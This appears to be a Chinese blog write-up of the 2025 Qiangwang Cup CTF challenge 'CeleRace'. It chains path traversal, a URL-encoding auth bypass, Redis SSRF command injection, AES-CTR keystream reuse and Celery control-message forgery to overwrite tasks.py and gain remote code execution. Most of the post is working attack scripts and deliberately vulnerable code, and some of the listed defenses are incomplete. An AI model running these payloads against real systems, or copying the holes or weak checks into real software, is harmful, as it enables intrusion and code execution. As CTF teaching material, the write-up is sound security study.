---
layout: post
title: 强网杯2025 CeleRace详解 - Celery任务队列RCE攻击链
date: 2025-11-22 00:00 +0800
tags: [CTF, Web安全, Celery, RCE, 漏洞分析]
toc: true
---

## 题目概述

**题目名称**: CeleRace  
**题目提示**: Carefully Read...Celeritously Race...Get a CRITICAL RCE...!

这是一道涉及Celery分布式任务队列的CTF Web题目，核心考点是通过多个漏洞的组合利用，最终实现远程代码执行(RCE)。题目涉及路径穿越、Redis SSRF、AES CTR加密缺陷以及Celery内部机制等多个知识点。

各个知识点我已经全部整理，在我的靶场[Github](https://github.com/GyroJibering/celerace-lab)中复现，未来会增加更多漏洞的复现，敬请期待吧！

---

## 知识点1: 路径穿越漏洞 (Path Traversal)

### 原理说明
路径穿越漏洞允许攻击者通过`../`序列访问或写入预期目录之外的文件。

### 简单样例

**漏洞代码**:
```python
# vulnerable_server.py
from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/save_session', methods=['POST'])
def save_session():
    session_id = request.cookies.get('session_id', 'default')
    data = request.json
    
    # 漏洞: 直接使用用户输入构造文件路径
    filepath = f"/tmp/sessions/{session_id}.json"
    
    with open(filepath, 'w') as f:
        f.write(str(data))
    
    return {"status": "saved", "path": filepath}

if __name__ == '__main__':
    app.run(port=5000)
```

**攻击脚本**:
```python
import requests

# 正常使用
r = requests.post(
    "http://localhost:5000/save_session",
    cookies={"session_id": "user123"},
    json={"username": "alice"}
)
print("正常访问:", r.json())
# 结果: /tmp/sessions/user123.json

# 路径穿越攻击
malicious_sid = "../" * 5 + "etc/passwd_backup"
r = requests.post(
    "http://localhost:5000/save_session",
    cookies={"session_id": malicious_sid},
    json={"evil": "payload"}
)
print("攻击后:", r.json())
# 结果: /tmp/sessions/../../../../../etc/passwd_backup.json
# 实际写入: /etc/passwd_backup.json
```

**防御方法**:
```python
import os

def safe_join(base_dir, user_input):
    # 规范化路径并检查是否在基础目录内
    full_path = os.path.normpath(os.path.join(base_dir, user_input))
    if not full_path.startswith(base_dir):
        raise ValueError("Path traversal detected!")
    return full_path
```

---

## 知识点2: URL编码绕过权限检查

### 原理说明
某些框架在路由匹配和权限检查时处理URL的方式不一致，可以通过URL编码绕过。

### 简单样例

**漏洞代码**:
```python
from flask import Flask, request, abort

app = Flask(__name__)

def require_admin(f):
    def wrapper(*args, **kwargs):
        path = request.path
        # 漏洞: 只检查原始路径
        if path.startswith('/admin/'):
            if not is_admin():
                abort(403)
        return f(*args, **kwargs)
    wrapper.__name__ = f.__name__
    return wrapper

def is_admin():
    return request.cookies.get('role') == 'admin'

@app.route('/admin/<path:action>')
@require_admin
def admin_action(action):
    return {"result": f"Admin action: {action}"}

@app.route('/<path:other>')
def public_action(other):
    return {"result": f"Public action: {other}"}

if __name__ == '__main__':
    app.run(port=5000)
```

**攻击脚本**:
```python
import requests

# 正常访问admin路径 - 被拦截
r = requests.get("http://localhost:5000/admin/delete_user")
print("直接访问:", r.status_code)  # 403 Forbidden

# URL编码绕过
# %2e%2e = ..
# Flask路由规范化: /admin/%2e%2e/x -> /admin/../x -> /x
r = requests.get("http://localhost:5000/admin/%2e%2e/%2e%2e/delete_user")
print("编码绕过:", r.status_code, r.json())  # 200 OK
```

**为什么能绕过**:
1. `require_admin`检查的是`request.path` = `/admin/%2e%2e/%2e%2e/delete_user`
2. 不匹配`/admin/`前缀（因为还有`%2e%2e`部分）
3. Flask路由系统会规范化路径，实际匹配到`/<path:other>`路由

---

## 知识点3: Redis协议SSRF注入

### 原理说明
Redis使用简单的文本协议(RESP)，可以通过HTTP请求注入Redis命令。

### 简单样例

**受害服务器代码**:
```python
from flask import Flask, request
import requests

app = Flask(__name__)

@app.route('/fetch', methods=['POST'])
def fetch_url():
    data = request.json
    url = data['url']
    method = data.get('verb', 'GET')
    
    # 漏洞: 直接使用用户输入作为HTTP方法
    response = requests.request(
        method=method,
        url=url,
        timeout=5
    )
    return {"status": "ok", "preview": response.text[:200]}

if __name__ == '__main__':
    app.run(port=5000)
```

**Redis服务器**:
```bash
# 启动Redis
docker run -d -p 6379:6379 redis:latest
```

**攻击脚本**:
```python
import requests

# 正常使用Redis客户端
import redis
r = redis.Redis(host='localhost', port=6379)
r.set('test_key', 'test_value')
print("Normal:", r.get('test_key'))

# SSRF攻击注入Redis命令
payload = {
    "url": "http://127.0.0.1:6379/",
    "verb": "SET evil_key malicious_value\r\nQUIT\r\n"
}

# 发送恶意请求
response = requests.post("http://localhost:5000/fetch", json=payload)
print("SSRF Response:", response.json())

# 验证注入成功
print("Injected:", r.get('evil_key'))  # b'malicious_value'

# 更复杂的例子: 读取所有键
payload = {
    "url": "http://127.0.0.1:6379/",
    "verb": "KEYS *\r\nQUIT\r\n"
}
response = requests.post("http://localhost:5000/fetch", json=payload)
print("All keys:", response.json())
```

**Redis协议格式**:
```bash
# RESP协议示例
*3\r\n          # 3个参数的数组
$3\r\nSET\r\n  # 第一个参数 "SET"
$3\r\nkey\r\n  # 第二个参数 "key"
$5\r\nvalue\r\n # 第三个参数 "value"

# 简化的命令格式（也被支持）
SET key value\r\n
```

---

## 知识点4: AES CTR模式与Nonce重用

### 原理说明
AES CTR模式通过加密计数器生成密钥流，与明文异或得到密文。如果nonce重复，可以恢复密钥流。

### 简单样例

**加密代码**:
```python
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import base64

# 模拟有漏洞的加密服务
class VulnerableEncryption:
    def __init__(self):
        self.key = get_random_bytes(16)
        self.nonce = get_random_bytes(8)  # 漏洞: 固定nonce
    
    def encrypt(self, plaintext):
        cipher = AES.new(self.key, AES.MODE_CTR, nonce=self.nonce)
        ciphertext = cipher.encrypt(plaintext.encode())
        return base64.b64encode(ciphertext).decode()

# 创建加密服务
encryptor = VulnerableEncryption()

# 加密多个消息（使用相同nonce）
msg1 = "This is message number 1"
msg2 = "This is message number 2"

ct1 = encryptor.encrypt(msg1)
ct2 = encryptor.encrypt(msg2)

print("密文1:", ct1)
print("密文2:", ct2)
```

**攻击脚本 - 已知明文攻击**:
```python
import base64

# 攻击者知道msg1的内容（已知明文）
known_plaintext = b"This is message number 1"
ct1_bytes = base64.b64decode(ct1)

# 恢复密钥流
# 因为: CT = PT ⊕ KeyStream
# 所以: KeyStream = PT ⊕ CT
keystream = bytes(a ^ b for a, b in zip(known_plaintext, ct1_bytes))

print("恢复的密钥流:", keystream.hex())

# 使用密钥流解密msg2
ct2_bytes = base64.b64decode(ct2)
recovered_msg2 = bytes(a ^ b for a, b in zip(ct2_bytes, keystream))

print("恢复的消息2:", recovered_msg2.decode())
print("原始消息2:", msg2)

# 构造任意加密消息
malicious_msg = b"This is EVIL message!!!"
malicious_ct = bytes(a ^ b for a, b in zip(malicious_msg, keystream))
print("伪造的密文:", base64.b64encode(malicious_ct).decode())
```

**完整演示**:
```python
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import base64

def demonstrate_ctr_reuse():
    # 密钥和nonce
    key = get_random_bytes(16)
    nonce = get_random_bytes(8)
    
    # 加密两条消息（相同nonce）
    cipher1 = AES.new(key, AES.MODE_CTR, nonce=nonce)
    pt1 = b"Attack at dawn tomorrow"
    ct1 = cipher1.encrypt(pt1)
    
    cipher2 = AES.new(key, AES.MODE_CTR, nonce=nonce)
    pt2 = b"Retreat immediately now"
    ct2 = cipher2.encrypt(pt2)
    
    print("=== 原始数据 ===")
    print(f"明文1: {pt1}")
    print(f"密文1: {ct1.hex()}")
    print(f"明文2: {pt2}")
    print(f"密文2: {ct2.hex()}")
    
    # 攻击者已知pt1和ct1，恢复密钥流
    keystream = bytes(a ^ b for a, b in zip(pt1, ct1))
    print(f"\n=== 恢复密钥流 ===")
    print(f"密钥流: {keystream.hex()}")
    
    # 解密未知消息pt2
    recovered_pt2 = bytes(a ^ b for a, b in zip(ct2, keystream))
    print(f"\n=== 解密消息2 ===")
    print(f"恢复的明文: {recovered_pt2}")
    
    # 伪造加密消息
    fake_msg = b"Cancel all operations"
    fake_ct = bytes(a ^ b for a, b in zip(fake_msg, keystream))
    print(f"\n=== 伪造消息 ===")
    print(f"伪造明文: {fake_msg}")
    print(f"伪造密文: {fake_ct.hex()}")
    
    # 验证伪造的密文
    cipher3 = AES.new(key, AES.MODE_CTR, nonce=nonce)
    decrypted = cipher3.decrypt(fake_ct)
    print(f"解密验证: {decrypted}")

demonstrate_ctr_reuse()
```

---

## 知识点5: Celery分布式任务队列

### 原理说明
Celery是Python的异步任务队列，使用Redis/RabbitMQ作为消息代理。

### 简单样例

**安装依赖**:
```bash
pip install celery redis
docker run -d -p 6379:6379 redis:latest
```

**任务定义 (tasks.py)**:
```python
from celery import Celery

# 配置Celery
app = Celery('demo_tasks', 
             broker='redis://localhost:6379/0',
             backend='redis://localhost:6379/0')

@app.task
def add(x, y):
    return x + y

@app.task
def slow_task(seconds):
    import time
    time.sleep(seconds)
    return f"Slept for {seconds} seconds"
```

**启动Worker**:
```bash
celery -A tasks worker --loglevel=info
```

**客户端调用**:
```python
from tasks import add, slow_task
import time

# 异步调用
result = add.delay(4, 6)
print(f"Task ID: {result.id}")
print(f"Task State: {result.state}")

# 等待结果
print(f"Result: {result.get(timeout=10)}")

# 创建多个任务
tasks = []
for i in range(5):
    task = slow_task.delay(2)
    tasks.append(task)
    print(f"Created task {i}: {task.id}")

# 等待所有任务完成
for i, task in enumerate(tasks):
    print(f"Task {i} result: {task.get()}")
```

**查看Redis中的任务数据**:
```python
import redis
import json

r = redis.Redis(host='localhost', port=6379, db=0)

# 查看队列中的任务
tasks = r.lrange('celery', 0, -1)
print(f"队列中有 {len(tasks)} 个任务")

for task in tasks[:3]:  # 只显示前3个
    task_data = json.loads(task)
    print("\n任务数据结构:")
    print(json.dumps(task_data, indent=2))

# 查看任务结果
keys = r.keys('celery-task-meta-*')
for key in keys[:3]:
    result = r.get(key)
    print(f"\n任务结果 {key.decode()}:")
    print(json.loads(result))
```

---

## 知识点6: Celery Control协议

### 原理说明
Celery支持向Worker发送控制命令，如shutdown、pool_restart等，这些命令也是通过消息队列传递。

### 简单样例

**使用API发送控制命令**:
```python
from celery import Celery

app = Celery('demo_tasks', 
             broker='redis://localhost:6379/0',
             backend='redis://localhost:6379/0')

# 方法1: 使用celery命令行
# celery -A tasks control shutdown

# 方法2: 使用Python API
from celery.bin import control

inspector = app.control.inspect()

# 查看活动任务
active_tasks = inspector.active()
print("Active tasks:", active_tasks)

# 查看注册的任务
registered = inspector.registered()
print("Registered tasks:", registered)

# 发送shutdown命令
app.control.shutdown()
```

**手动构造Control消息**:
```python
import json
import uuid
import redis
import base64
from kombu.serialization import dumps

r = redis.Redis(host='localhost', port=6379, db=0)

# 构造control消息
control_msg = {
    "method": "shutdown",
    "arguments": {},
    "destination": None,
    "pattern": None,
    "matcher": None,
    "ticket": str(uuid.uuid4()),
    "reply_to": {
        "exchange": "reply.celery.pidbox",
        "routing_key": str(uuid.uuid4()),
    },
}

# 序列化
body = dumps(control_msg)

# 构造Celery消息格式
task = {
    "body": base64.b64encode(body).decode("utf-8"),
    "content-encoding": "binary",
    "content-type": "application/json",
    "headers": {},
    "properties": {
        "correlation_id": str(uuid.uuid4()),
        "delivery_mode": 2,
    },
}

# 推送到控制队列
r.lpush('celery', json.dumps(task))
print("Control message sent!")
```

---

## 知识点7: Race Condition竞态条件

### 原理说明
当多个操作同时发生时，由于时序问题导致的安全漏洞。

### 简单样例

**漏洞代码**:
```python
from flask import Flask, request
import threading
import time

app = Flask(__name__)

# 全局变量（漏洞所在）
user_balance = {"alice": 100}

@app.route('/transfer', methods=['POST'])
def transfer():
    data = request.json
    user = data['user']
    amount = data['amount']
    
    # 检查余额
    if user_balance.get(user, 0) >= amount:
        # 漏洞: 检查和扣款之间有时间间隔
        time.sleep(0.1)  # 模拟数据库查询延迟
        
        user_balance[user] -= amount
        return {"status": "success", "new_balance": user_balance[user]}
    
    return {"status": "insufficient funds"}, 400

@app.route('/balance/<user>')
def get_balance(user):
    return {"balance": user_balance.get(user, 0)}

if __name__ == '__main__':
    app.run(port=5000, threaded=True)
```

**攻击脚本 - 利用竞态条件**:
```python
import requests
import threading

def transfer_money():
    try:
        r = requests.post('http://localhost:5000/transfer', 
                         json={"user": "alice", "amount": 60})
        print(f"Thread {threading.current_thread().name}: {r.json()}")
    except Exception as e:
        print(f"Error: {e}")

# 创建多个并发请求
threads = []
for i in range(5):
    t = threading.Thread(target=transfer_money, name=f"T{i}")
    threads.append(t)

# 同时启动所有线程
for t in threads:
    t.start()

for t in threads:
    t.join()

# 检查最终余额
r = requests.get('http://localhost:5000/balance/alice')
print(f"\nFinal balance: {r.json()}")
# 期望: 100 - 60 = 40
# 实际: 可能是负数！（多次扣款成功）
```

**在Celery场景中的应用**:
```python
import multiprocessing
import requests

def create_task(task_id):
    """创建耗时任务"""
    requests.post('http://target/tasks/slow', 
                 json={"data": "x" * 1000, "sleep": 30})

# 创建大量任务造成积压
pool = multiprocessing.Pool(processes=50)
for i in range(100):
    pool.apply_async(create_task, args=(i,))
pool.close()

# 在积压期间执行SSRF读取pending任务
requests.post('http://target/ssrf', 
             json={"url": "http://redis:6379/", 
                   "cmd": "LRANGE celery 0 -1"})
```

---

## 完整攻击流程

### 步骤1: 路径穿越启用debug模式

```python
import requests

TARGET = "http://ctf-target:5000"

# 利用路径穿越写入debug标志文件
malicious_sid = "../" * 10 + "tmp/debug"
r = requests.post(
    f"{TARGET}/register",
    cookies={"mini_session": malicious_sid},
    json={"username": "pwn", "password": "pwn"},
)
print("Debug enabled:", r.status_code)
```

### 步骤2: 绕过admin检查

```python
def api_post(path, json_body):
    r = requests.post(f"{TARGET}{path}", json=json_body, timeout=5)
    return r.json()

# 正常路径被拦截
# /tasks/fetch -> 403 Forbidden

# 使用URL编码绕过
bypass_path = "/tasks/fetch/%2e%2e/%2e%2e/x"
payload = {"url": "http://example.com", "verb": "GET"}
result = api_post(bypass_path, payload)
print("Bypass result:", result)
```

### 步骤3: Redis SSRF + Race Condition

```python
import multiprocessing
import time

# 创建大量耗时任务
def flood_tasks():
    pool = multiprocessing.Pool(processes=50)
    for i in range(100):
        payload = {"url": "http://slowserver.com/slow", "verb": "POST"}
        pool.apply_async(api_post, args=(bypass_path, payload))
    pool.close()
    pool.join()

print("Flooding tasks...")
flood_tasks()

# Redis SSRF读取队列
ssrf_payload = {
    "url": "http://127.0.0.1:6379/",
    "verb": "LRANGE celery 0 10\r\nQUIT\r\n",
    "host": "127.0.0.1",
    "body": ""
}
result = api_post(bypass_path, ssrf_payload)
print("SSRF result:", result)
```

### 步骤4: AES CTR密钥流恢复

```python
import base64

# 从SSRF结果中提取密文
preview = result['result']['preview']
task_data = preview.split('\r\n')[2]  # 解析Redis响应
encrypted_body = json.loads(task_data)['body']

# 已知明文（我们自己创建的任务）
known_plaintext = b'[[],{"url":"http://slowserver.com/slow","verb":"POST"}...]'

# 恢复密钥流
ciphertext = base64.b64decode(encrypted_body)
keystream = bytes(a ^ b for a, b in zip(known_plaintext, ciphertext))

print("Keystream recovered:", keystream.hex()[:50])
```

### 步骤5: 覆盖tasks.py

```python
import uuid

task_id = str(uuid.uuid4())

# 构造DiagnosticsPersistError
malicious_task = {
    "status": "FAILURE",
    "result": {
        "exc_type": "DiagnosticsPersistError",
        "exc_message": json.dumps({
            "path": "/app/src/tasks.py",
            "content": """
import subprocess

def echo(message):
    return subprocess.check_output(message, shell=True).decode()
"""
        }),
        "exc_module": "framework.app",
    },
    "task_id": task_id,
}

# 通过Redis SSRF写入
ssrf_payload = {
    "url": "http://127.0.0.1:6379/",
    "verb": f"SET celery-task-meta-{task_id} {json.dumps(json.dumps(malicious_task))}\r\nQUIT\r\n",
    "host": "127.0.0.1",
    "body": ""
}
api_post(bypass_path, ssrf_payload)

# 触发错误处理
requests.get(f"{TARGET}/tasks/result?id={task_id}")
print("tasks.py overwritten!")
```

### 步骤6: 发送shutdown控制消息

```python
# 构造shutdown消息
shutdown_msg = {
    "method": "shutdown",
    "arguments": {},
    "ticket": str(uuid.uuid4()),
    "reply_to": {
        "exchange": "reply.celery.pidbox",
        "routing_key": str(uuid.uuid4()),
    },
}

# 使用恢复的密钥流加密
msg_bytes = json.dumps(shutdown_msg).encode()
encrypted = bytes(a ^ b for a, b in zip(msg_bytes, keystream))

# 构造Celery消息
task = {
    "body": base64.b64encode(encrypted).decode(),
    "content-encoding": "binary",
    "content-type": "application/x-miniws",
}

# 注入Redis
ssrf_payload = {
    "url": "http://127.0.0.1:6379/",
    "verb": f"LPUSH celery {json.dumps(json.dumps(task))}\r\nQUIT\r\n",
    "host": "127.0.0.1",
    "body": ""
}
api_post(bypass_path, ssrf_payload)
print("Shutdown message sent!")
```

### 步骤7: RCE获取Flag

```python
import time

time.sleep(5)  # 等待Worker重启

# 调用被修改的echo任务
r = api_post("/tasks/echo", {"message": "cat /flag"})
task_id = r["task_id"]

# 获取结果
time.sleep(2)
result = requests.get(f"{TARGET}/tasks/result?id={task_id}").json()
print("FLAG:", result['result']['echo'])
```

---

## 防御措施总结

### 1. 路径穿越防御
```python
import os

def validate_path(base_dir, user_input):
    safe_path = os.path.realpath(os.path.join(base_dir, user_input))
    if not safe_path.startswith(os.path.realpath(base_dir)):
        raise SecurityError("Path traversal detected")
    return safe_path
```

### 2. 权限检查防御
```python
def require_admin(f):
    def wrapper(*args, **kwargs):
        # 使用规范化后的路径检查
        normalized_path = os.path.normpath(request.path)
        if normalized_path.startswith('/admin/'):
            verify_admin()
        return f(*args, **kwargs)
    return wrapper
```

### 3. SSRF防御
```python
def is_safe_url(url):
    from urllib.parse import urlparse
    parsed = urlparse(url)
    
    # 禁止内网IP
    if parsed.hostname in ['127.0.0.1', 'localhost']:
        return False
    
    # 白名单域名
    allowed_domains = ['example.com', 'api.trusted.com']
    if parsed.hostname not in allowed_domains:
        return False
    
    return True
```

### 4. 加密安全
```python
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

def encrypt_message(plaintext, key):
    # 每次使用新的nonce
    nonce = get_random_bytes(8)
    cipher = AES.new(key, AES.MODE_CTR, nonce=nonce)
    ciphertext = cipher.encrypt(plaintext)
    
    # 返回nonce和密文
    return nonce + ciphertext
```

### 5. 竞态条件防御
```python
import threading

lock = threading.Lock()

def transfer(user, amount):
    with lock:  # 原子操作
        if user_balance[user] >= amount:
            user_balance[user] -= amount
            return True
    return False
```

---

## 总结

这道CTF题目展示了一个完整的攻击链，涉及的技术点包括：

1. **Web安全**: 路径穿越、权限绕过、SSRF
2. **密码学**: AES CTR模式、已知明文攻击、密钥流重用
3. **分布式系统**: Celery任务队列、Redis消息代理
4. **并发编程**: Race Condition、多线程竞争
5. **协议分析**: Redis RESP协议、Celery消息格式

每个小漏洞单独看似不严重，但组合起来形成了一条完整的RCE攻击链。这提醒我们在实际开发中必须：

- 实施纵深防御策略
- 对所有用户输入进行严格验证
- 正确使用加密算法
- 保护内部服务不被外部访问
- 仔细处理并发和异步操作
